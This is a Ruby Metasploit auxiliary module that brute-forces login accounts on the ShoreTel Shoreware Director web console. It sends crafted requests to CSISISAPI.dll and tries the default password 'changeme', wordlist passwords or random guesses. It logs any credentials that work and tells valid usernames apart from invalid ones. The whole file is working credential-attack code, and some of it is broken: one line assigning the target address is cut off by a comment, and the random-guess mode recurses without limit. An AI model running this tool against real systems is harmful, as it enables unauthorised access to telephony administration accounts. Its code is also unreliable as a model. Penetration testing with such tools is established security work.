##
# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##


require 'msf/core'


class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::Remote::HttpClient
	include Msf::Auxiliary::Report
	include Msf::Auxiliary::AuthBrute
	include Msf::Auxiliary::Scanner

	def initialize
		super(
			'Name'		   => 'Shoreware Director User Bruteforcer',
			'Version'		=> '$Revision$',
			'Description'	=> 'This module simply attempts to bruteforce Shoretel users accounts or attempts to try the default password.',
			'References'  =>
				[
					# General
					[ 'URL', 'http://milo2012.wordpress.com' ]
				],
			'Author'		 => [ 'Keith Lee <keith.lee2012[at]gmail.com>' ],
			'License'		=> MSF_LICENSE
		)
		
		register_options(
			[
				Opt::RPORT(5440),
				OptString.new('USER_FILE', [false, 'File containing users, one per line','C:/Program Files/Rapid7/framework/msf3/data/wordlists/shoretel_users.txt']),
				OptString.new('PASS_FILE', [false, 'File containing passwords used for dictionary attacks, one per line','C:/Program Files/Rapid7/framework/msf3/data/wordlists/dict.txt']),
				OptInt.new('TEST_OPTION',  [true,  'Set 1 for Default Password. Set 2 for Password File.  Set 3 for BruteForce',1]),
				OptBool.new('BRUTEFORCE_SINGLE', [ true, "Test a single account. If set to false, all accounts in USER_FILE are tested.", true ]),							
				
			], self.class)
		register_autofilter_ports([ 5440 ])
	end

	def bruteforce_password(user)
		verbose = datastore['VERBOSE']
		#if datastore['BRUTEFORCE_SINGLE']
		ip = #{datastore['USERNAME']}
		pass     = Rex::Text.rand_text_alphanumeric(8)
		passHash = Rex::Text::md5(pass)
		compName = Rex::Text.rand_text_alpha(20)
		vprint_status("#{rhost}:#{rport} - Trying username:"+user+" password:'#{pass}'")
		success = false

		data = '?request?00000000-0000-0000-0000-000000000000;CCSISSvrCONN::connectX;20;'+compName+';'+user.length.to_s+';'
		data << user+';32;'+passHash		
		data1 = "/CSIS/CSISISAPI.dll"+data
		
		begin
			res = send_request_raw({
					'uri'	 => data1,
					'method'  => 'GET',
					'headers' => {
						'User-Agent'    => 'CSIS',
						'HttpReqHost'	=> ip+':5440',
						'Cache-Control' => 'no-cache',
					}	

				}, 45)
			return :abort if (res.code == 404)
			success = true if(res.body.match(/0x00000000/))
			success

		rescue ::Rex::ConnectionError
			vprint_error("#{rhost}:#{rport} - Unable to attempt authentication")
			return :abort
		end

		if success
			print_good("#{rhost}:#{rport} - Successful login "+user+" : '#{pass}'")
			report_auth_info(
				:host   => rhost,
				:proto => 'tcp',
				:sname  => 'shoretel_brute',
				:user   => user,
				:pass   => pass,
				:target_host => rhost,
				:target_port => rport
			)
			return :next_user
		else
			vprint_error("#{rhost}:#{rport} - Failed to login as "+user+" using password '#{pass}'")
			if datastore['TEST_OPTION']==1
				return
			end
			if datastore['TEST_OPTION']==3
				bruteforce_password(user)
				return
			end
		end			
	end
	
	
	def run_host(ip)
		verbose = datastore['VERBOSE']
		if !datastore['BRUTEFORCE_SINGLE']
			if !datastore['USER_FILE']
				vprint_status("Warning: USER_FILE variable must be set first")
				return
			end
			@userlist = datastore['USER_FILE'] 
			File.readlines(@userlist).each do |line|
				user = line.strip()
				user = user.gsub(/@[a-zA-Z]+\.[a-zA-Z]{2,4}/,'')
				userLen = user.length.to_s
				if datastore['TEST_OPTION']==3
					vprint_status("bruteforce user")
					bruteforce_password(user)
				end				
				if datastore['TEST_OPTION']==2
					if !datastore['PASS_FILE']
						vprint_status("Warning: PASS_FILE must be set before continuing")
						return
					end

					@userpasslist = datastore['PASS_FILE'] 
					File.readlines(@userpasslist).each do |line|
						pass = line.strip()		
						passHash = Rex::Text::md5(pass)
						compName = Rex::Text.rand_text_alpha(20)
						vprint_status("#{rhost}:#{rport} - Trying username:'#{user}' password:'#{pass}'")
						success = false

						data = '?request?00000000-0000-0000-0000-000000000000;CCSISSvrCONN::connectX;20;'+compName
						data << ';'+user.length.to_s+';'+user+';32;'+passHash	
						data1 = "/CSIS/CSISISAPI.dll"+data
						begin
							res = send_request_raw({
									'uri'	 => data1,
									'method'  => 'GET',
									'headers' => {
										'User-Agent'    => 'CSIS',
										'HttpReqHost'	=> ip+':5440',
										'Cache-Control' => 'no-cache',
									}

								}, 45)
							return :abort if (res.code == 404)
							success = true if(res.body.match(/0x00000000/))
							success

						rescue ::Rex::ConnectionError
							vprint_error("#{rhost}:#{rport} - Unable to attempt authentication")
							return :abort
						end

						if success
							print_good("#{rhost}:#{rport} - Successful login '#{user}' : '#{pass}'")
							report_auth_info(
								:host   => rhost,
								:proto => 'tcp',
								:sname  => 'shoretel_brute',
								:user   => user,
								:pass   => pass,
								:port 	=> rport
							)						
							return :next_user
						else
							vprint_error("#{rhost}:#{rport} - Failed to login as '#{user}' using password '#{pass}'")
							#return
						end		
					end
				end
				
				if datastore['TEST_OPTION']==1
					vprint_status("#{rhost}:#{rport} - Trying username:'#{user}' password:'changeme'")
					success = false
					wrongusername=false
					pass='changeme'
					passHash = Rex::Text::md5(pass)
					compName = Rex::Text.rand_text_alpha(20)
					data = '?request?00000000-0000-0000-0000-000000000000;CCSISSvrCONN::connectX;20;'+compName+';'+userLen+';'
					data << user+';32;'+passHash		
					data1 = "/CSIS/CSISISAPI.dll"+data

					begin
						res = send_request_raw({
								'uri'	 => data1,
								'method'  => 'GET',
								'headers' => {
									'User-Agent'    => 'CSIS',
									'HttpReqHost'	=> ip+':5440',
									'Cache-Control' => 'no-cache',
								}

							}, 45)
						return :abort if (res.code == 404)
						resultSplit = res.body.split(";")
						extNum = resultSplit[5]
						success = true if(res.body.match(/0x00000000/))
						wrongusername = true if(res.body.match(/0xC110070C/))
						invalidpassword = true if(res.body.match(/0xC110070D/))
						success

					rescue ::Rex::ConnectionError
						vprint_error("#{rhost}:#{rport} - Unable to attempt authentication")
						return :abort
					end
					if wrongusername
						vprint_status("#{rhost}:#{rport} - Invalid Username '#{user}'")			
					end
					if invalidpassword
						vprint_status("#{rhost}:#{rport} - Invalid Password 'changeme'")			
					end

					if success and !wrongusername
						print_good("#{rhost}:#{rport} - Successful login '#{user}' : '#{pass}' : Ext : '#{extNum}'")
						report_auth_info(
							:host   => rhost,
							:port   => rport,
							:sname  => 'shoretel_brute Ext:'+extNum,
							:user   => user,
							:pass   => pass,
							:active => true
						)
						#return :next_user
					end			
				end
			end
		end		
		if datastore['BRUTEFORCE_SINGLE']
			if !datastore['USERNAME']
				vprint_status("Warning: Username must be set before continuing")
				return
			end
			if datastore['TEST_OPTION']==3
				bruteforce_password(datastore['USERNAME'])
			end
			if datastore['TEST_OPTION']==1
				passList = ['changeme']
				passList.each do |pass|
					passHash = Rex::Text::md5(pass)
					compName = Rex::Text.rand_text_alpha(20)
					vprint_status("Shoreware Director Web Console - Bruteforce Single User Account")
					vprint_status("#{rhost}:#{rport} - Trying username:'#{datastore['USERNAME']}' password:'#{pass}'")
					success = false

					data = '?request?00000000-0000-0000-0000-000000000000;CCSISSvrCONN::connectX;20;'+compName
					data << ';'+datastore['USERNAME'].length.to_s+';'+datastore['USERNAME']+';32;'+passHash			
					data1 = "/CSIS/CSISISAPI.dll"+data
					
					begin
						res = send_request_raw({
								'uri'	 => data1,
								'method'  => 'GET',
								'headers' => {
									'User-Agent'    => 'CSIS',
									'HttpReqHost'	=> ip+':5440',
									'Cache-Control' => 'no-cache',
								}

							}, 45)
						return :abort if (res.code == 404)
						success = true if(res.body.match(/0x00000000/))
						success

					rescue ::Rex::ConnectionError
						vprint_error("#{rhost}:#{rport} - Unable to attempt authentication")
						return :abort
					end

					if success
						print_good("#{rhost}:#{rport} - Successful login '#{datastore['USERNAME']}' : '#{pass}'")
						report_auth_info(
							:host   => rhost,
							:proto => 'tcp',
							:sname  => 'shoretel_brute',
							:user   => datastore['USERNAME'],
							:pass   => pass,
							:target_host => rhost,
							:target_port => rport
						)
						return :next_user
					else
						vprint_error("#{rhost}:#{rport} - Failed to login as '#{datastore['USERNAME']}' using password '#{pass}'")
						return
					end
				end				
			end
			if datastore['TEST_OPTION']==2
				if !datastore['PASS_FILE']
					vprint_status("Warning: PASS_FILE must be set before continuing")
					return
				end
				#if datastore['BRUTEFORCE_PASSWORDFILE'] and datastore['PASS_FILE']

				vprint_status("Shoreware Director Web Console - Bruteforce Single User Account with Password File")
				@userpasslist = datastore['PASS_FILE'] 
				File.readlines(@userpasslist).each do |line|
					pass = line.strip()		
					passHash = Rex::Text::md5(pass)
					compName = Rex::Text.rand_text_alpha(20)
					vprint_status("#{rhost}:#{rport} - Trying username:'#{datastore['USERNAME']}' password:'#{pass}'")
					success = false

					data = '?request?00000000-0000-0000-0000-000000000000;CCSISSvrCONN::connectX;20;'+compName
					data << ';'+datastore['USERNAME'].length.to_s+';'+datastore['USERNAME']+';32;'+passHash	
					data1 = "/CSIS/CSISISAPI.dll"+data
					
					begin
						res = send_request_raw({
								'uri'	 => data1,
								'method'  => 'GET',
								'headers' => {
									'User-Agent'    => 'CSIS',
									'HttpReqHost'	=> ip+':5440',
									'Cache-Control' => 'no-cache',
								}

							}, 45)
						return :abort if (res.code == 404)
						success = true if(res.body.match(/0x00000000/))
						success

					rescue ::Rex::ConnectionError
						vprint_error("#{rhost}:#{rport} - Unable to attempt authentication")
						return :abort
					end

					if success
						print_good("#{rhost}:#{rport} - Successful login '#{datastore['USERNAME']}' : '#{pass}'")
						report_auth_info(
							:host   => rhost,
							:proto => 'tcp',
							:sname  => 'shoretel_brute',
							:user   => datastore['USERNAME'],
							:pass   => pass,
							:port 	=> rport
						)						
						return :next_user
					else
						vprint_error("#{rhost}:#{rport} - Failed to login as '#{datastore['USERNAME']}' using password '#{pass}'")
						#return
					end		
				end	
			end			
		end
		
	end
end
